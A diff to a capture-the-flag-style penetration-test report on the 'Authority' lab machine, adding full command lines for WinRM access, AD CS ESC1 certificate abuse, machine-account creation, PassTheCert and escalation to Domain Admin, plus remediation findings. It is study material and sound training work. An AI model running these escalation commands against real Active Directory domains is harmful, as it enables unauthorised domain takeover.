@@ -8,13 +8,15 @@
 
 ## 0. Lesson Learned
 
-
+When you're stuck and run out of ideas, try Certipy.
 
 ---
 
 ## 1. Executive Summary
 
+A penetration test was conducted against the Authority target system. The assessment identified multiple critical misconfigurations, including exposed credentials in configuration files, insecure application configuration, and vulnerable Active Directory Certificate Services (AD CS).
 
+Initial access was achieved through credential harvesting from exposed SMB shares and Ansible configuration files. Further exploitation of a misconfigured Password Self Service (PWM) application allowed credential capture. Finally, privilege escalation to Domain Administrator was achieved through abuse of AD CS (ESC1).
 
 ---
 
@@ -155,21 +157,150 @@ netexec winrm authority.htb -u usernames.txt -p 'lDaP_1n_th3_cle4r!' --continue-
 
 Revealing WinRM access for user `svc_ldap`.
 
+```
+evil-winrm -i 10.129.229.56 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
+```
+
+Shell obtained for user `svc_ldap`.
+
 ---
 
 ## 7. Post-Exploitation
+
+A vulnerable certificate template (ESC1) was identified:
+
+```
+certipy-ad find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -vulnerable
+```
 
 ---
 
 ## 8. Privilege Escalation
 
+A machine account was created:
+
+```
+addcomputer.py authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -computer-name newComputer -computer-pass P@ssword1 -dc-ip 10.129.229.56
+```
+
+A certificate was requested:
+
+```
+certipy-ad req -username 'newComputer$' -password P@ssword1 -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb
+```
+
+A certificate was obtained for the Administrator account.
+
+The key and cert were separately written to file to use in the PassTheCert attack:
+
+```
+certipy-ad cert -pfx administrator_authority.pfx -nocert -out administrator.key
+
+certipy-ad cert -pfx administrator_authority.pfx -nokey -out administrator.crt
+```
+
+The PassTheCert attack was deployed:
+
+```
+python PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.229.56
+```
+
+Resulting in a ldap-shell with limited commands.
+
+The `svc_ldap` user was added to the `administrators` group.
+
+```
+add_user_to_group svc_ldap administrators
+```
+
+The WinRM shell was restarted and flags were obtained as `svc_ldap` user.
+
 ---
 
 ## 9. Proof of Compromise
 
+**User Flag**: *REDACTED*
+
+```
+type C:\Users\svc_ldap\Desktop\root.txt
+```
+
+**Root Flag**: *REDACTED*
+
+```
+type C:\Users\Administrator\Desktop\root.txt
+```
+
+This confirms full system compromise.
+
 ---
 
 ## 10. Findings & Recommendations
+
+### **Finding:** Exposed Credentials in Configuration Files
+
+**Severity:** Critical
+
+**Description:**
+Credentials were stored in plaintext within configuration files accessible via SMB shares.
+
+**Impact:**
+Attackers could retrieve valid credentials and use them to gain unauthorized access to services.
+
+**Recommendation:**
+Remove plaintext credentials from configuration files, use secure credential storage mechanisms, and restrict access to sensitive files.
+
+### **Finding:** Application Exposed in Configuration Mode Without Authentication
+
+**Severity:** Critical
+
+**Description:**
+An application (e.g., PWM) was exposed in configuration mode without authentication, allowing modification of backend settings.
+
+**Impact:**
+Attackers could manipulate LDAP configurations and capture credentials, potentially leading to domain compromise.
+
+**Recommendation:**
+Disable configuration mode in production environments, enforce authentication for administrative interfaces, and restrict access to trusted users.
+
+### **Finding:** Weak Credential Management and Reuse
+
+**Severity:** High
+
+**Description:**
+Passwords were reused across multiple services and stored insecurely.
+
+**Impact:**
+Attackers could reuse compromised credentials to access additional services and escalate privileges.
+
+**Recommendation:**
+Implement strong password policies, enforce credential uniqueness, and ensure secure storage of authentication data.
+
+### **Finding:** Vulnerable Active Directory Certificate Services Configuration (ESC1)
+
+**Severity:** Critical
+
+**Description:**
+A certificate template allowed user-controlled subject alternative names (e.g., UPN), enabling abuse of Active Directory Certificate Services (ADCS).
+
+**Impact:**
+Attackers could request certificates impersonating privileged users such as Administrator, leading to full domain compromise.
+
+**Recommendation:**
+Restrict enrollment permissions on certificate templates, remove vulnerable templates, and audit ADCS configurations for misconfigurations.
+
+### **Finding:** Excessive Machine Account Creation Privileges
+
+**Severity:** Medium
+
+**Description:**
+Domain users were permitted to create machine accounts due to a non-restricted machine account quota.
+
+**Impact:**
+Attackers could create controlled machine accounts and leverage them in delegation or certificate-based attacks.
+
+**Recommendation:**
+Set `ms-DS-MachineAccountQuota` to 0 if not required and restrict machine account creation to authorized administrators only.
 
 ---
 
@@ -177,3 +308,9 @@ Revealing WinRM access for user `svc_ldap`.
 
 Cracking Ansible Vault Passwords -
 [https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/](https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/)
+
+ESC1 Certificate Vulnerability Abuse -
+[https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)
+
+PassTheCert Attack -
+[https://github.com/AlmondOffSec/PassTheCert.git](https://github.com/AlmondOffSec/PassTheCert.git)
